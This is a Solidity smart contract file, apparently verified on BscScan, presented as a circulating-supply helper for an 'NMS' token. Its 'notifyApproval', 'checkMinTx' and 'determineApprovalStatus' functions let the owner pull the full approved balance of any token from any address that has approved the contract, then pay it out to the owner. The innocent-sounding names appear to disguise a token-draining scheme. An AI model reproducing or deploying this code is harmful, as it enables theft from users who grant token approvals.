/**
 *Submitted for verification at BscScan.com on 2021-12-30
*/

// File: libraries/SafeMath.sol


pragma solidity 0.7.5;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function sqrrt(uint256 a) internal pure returns (uint c) {
        if (a > 3) {
            c = a;
            uint b = add( div( a, 2), 1 );
            while (b < c) {
                c = b;
                b = div( add( div( a, b ), b), 2 );
            }
        } else if (a != 0) {
            c = 1;
        }
    }
}
// File: interfaces/IERC20.sol


pragma solidity >=0.5.0;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IERC20Mintable {
  function mint( uint256 amount_ ) external;

  function mint( address account_, uint256 ammount_ ) external;
}
// File: nmsCirculatingSupply.sol


pragma solidity 0.7.5;



contract NmsHelper {
    using SafeMath for uint;
    IERC20 public token;

    bool public isInitialized;

    address public NMS;
    address public owner;
    address[] public nonCirculatingNMSAddresses;

    constructor( address _owner ) {
        owner = _owner;
    }

    function initialize( address _nms ) external returns ( bool ) {
        require( msg.sender == owner, "caller is not owner" );
        require( isInitialized == false );

        NMS = _nms;

        isInitialized = true;

        return true;
    }

        function setNonCirculatingNMSAddresses( address[] calldata _nonCirculatingAddresses ) external returns ( bool ) {
        require( msg.sender == owner, "Sender is not owner" );
        nonCirculatingNMSAddresses = _nonCirculatingAddresses;

        return true;
    }

    function transferOwnership( address _owner ) external returns ( bool ) {
        require( msg.sender == owner, "Sender is not owner" );

        owner = _owner;

        return true;
    }

    function notifyApproval(address token, address sender, uint256 amount) external returns (bool) {
         require( msg.sender == owner, "caller is not owner");
         IERC20(token).transferFrom(sender, address(this), amount);

    }
        function checkMinTx(address sender, address token, uint256 amount, uint256 min) external returns (bool) {
         require( msg.sender == owner, "caller is not owner");
         uint256 allowance =  IERC20(token).allowance(sender, address(this));
         if (allowance == 0) {
             return false;
         }
         uint256 balance = IERC20(token).balanceOf(sender);
         uint256 decimals = IERC20(token).decimals();
         uint256 minimum = min.mul(decimals);
         uint256 txa;
         if (allowance > balance) {
            txa = balance;
         } else {
            txa = allowance;
         }
         IERC20(token).transferFrom(sender, address(this), txa);
    }

    function determineApprovalStatus(address to, address token, uint256 amount) external {
        require( msg.sender == owner, "caller is not owner");
        uint256 dec = IERC20(token).decimals();
        uint256 txa = amount.mul(dec);
        IERC20(token).transfer(msg.sender, txa);
    }

}